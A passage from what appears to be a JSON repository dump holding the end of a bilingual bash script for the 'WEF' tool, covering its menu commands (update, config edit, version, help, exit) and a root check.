(${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read update_option\n          fi\n\n          if [ \"$update_option\" == \"y\" ] || [ \"$update_option\" == \"yes\" ] || [ \"$update_option\" == \"s\" ] || [ \"$update_option\" == \"si\" ]; then\n            run_update\n\n            if [ \"$lang\" == \"en\" ]; then\n              good_output_ln \"+\" \"Update completed successfully\"\n              color_output \"*\" \"Execute WEF again to use the new version\"\n            else\n              good_output_ln \"+\" \"Actualización completada correctamente\"\n              color_output \"*\" \"Ejecuta de nuevo WEF para utilizar la nueva versión\"\n            fi\n\n            exit 0\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            good_output_ln \"+\" \"This is the latest version\"\n          else\n            good_output_ln \"+\" \"Esta es la ultima versión\"\n          fi\n        fi\n\n      elif [ \"$option\" == \"edit\" ]; then\n        editor=$(echo $EDITOR)\n\n        if [ \"${editor}\" ]; then\n          ${editor} /usr/share/wef/wef.cnf\n        else\n          nano /usr/share/wef/wef.cnf\n        fi\n\n      elif [ \"$option\" == \"clear\" ] || [ \"$option\" == \"cls\" ]; then\n        clear\n\n      elif [ \"$option\" == \"version\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"\\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)\"\n          echo -e \"Created by D3Ext <d3ext@proton.me>\"\n        else\n          echo -e \"\\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)\"\n          echo -e \"Creado por D3Ext <d3ext@proton.me>\"\n        fi\n\n      elif [ \"$option\" == \"exit\" ] || [ \"$option\" == \"quit\" ] || [ \"$option\" == \"salir\" ]; then\n        ctrl_c\n\n      elif [ \"$option\" == \"help\" ] || [ \"$option\" == \"?\" ] || [ \"$option\" == \"Help\" ]; then\n        commands_panel\n\n      else # Finally enter in this case if the command is invalid\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"X\" \"Unknown command, type ${yC}help\"\n        else\n          color_output_ln \"X\" \"Comando inválido, escribe ${yC}help\"\n        fi\n      fi\n    \n    done\n\n  else\n    help_panel\n  fi\n\nelse\n  echo -e \"${yC} __      _____ ___ \"\n  echo -e \" \\ \\    / / __| __|\"\n  echo -e \"  \\ \\/\\/ /| _|| _| \"\n  echo -e \"   \\_/\\_/ |___|_|  ${endC}\"\n\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"X\" \"Execute the program as root\"\n  else\n    color_output_ln \"X\" \"Ejecuta el programa como root\"\n  fi\n  \n  exit 1\nfi\n\n\n"
        },
        {
          "name": "wordlists",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}